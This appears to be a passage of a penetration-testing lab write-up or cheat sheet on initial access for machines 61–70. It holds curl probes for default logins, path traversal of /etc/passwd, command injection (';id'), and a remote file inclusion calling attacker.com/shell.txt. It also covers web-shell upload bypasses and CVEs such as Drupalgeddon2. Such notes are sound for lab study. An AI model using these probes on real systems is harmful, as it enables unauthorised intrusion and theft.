## 🔓 Initial Access (Machines 61–70)

```bash
# Exploiting known CMS or web app vulnerabilities
curl -X POST http://<IP>/login -d 'username=admin&password=admin'   # Try default creds  
curl http://<IP>/config.php | grep password                         # Check for config leaks  
wpscan --url http://<IP> --enumerate u,vp                           # Enumerate WP users/plugins  

# File upload exploitation
Upload shell.php.jpg or shell.phtml through vulnerable upload form  
Bypass using .htaccess or double extensions  

# LFI/RFI leading to shell access
curl http://<IP>/index.php?page=../../../../etc/passwd              # Test for LFI  
curl http://<IP>/index.php?page=http://attacker.com/shell.txt       # Test for RFI  

# Command injection in form fields or parameters
curl http://<IP>/?cmd=whoami                                        # Simple test  
curl http://<IP>/?input=;id                                         # Injection attempt  
```

---

### ✅ Techniques Observed (Across Machines 61–70)

- **File Upload Exploits**: Several machines allowed unrestricted file uploads that led to web shells.
- **Default Credentials**: Many admin panels used common username:password combos.
- **CMS Exploits**: WordPress, Joomla, and custom CMSes with known vulnerabilities (e.g., plugin RCEs).
- **LFI/RFI**: Leveraged to read sensitive files or fetch external reverse shells.
- **Command Injection**: URL parameters were abused to execute system commands.

---

### ⚙️ Example Exploits

- `CVE-2018-7600` (Drupalgeddon2): Remote code execution via crafted HTTP requests.
- `CVE-2020-25213`: WonderCMS config leak → password reuse on SSH.
- Web shells via `shell.php.jpg` and `.htaccess` override.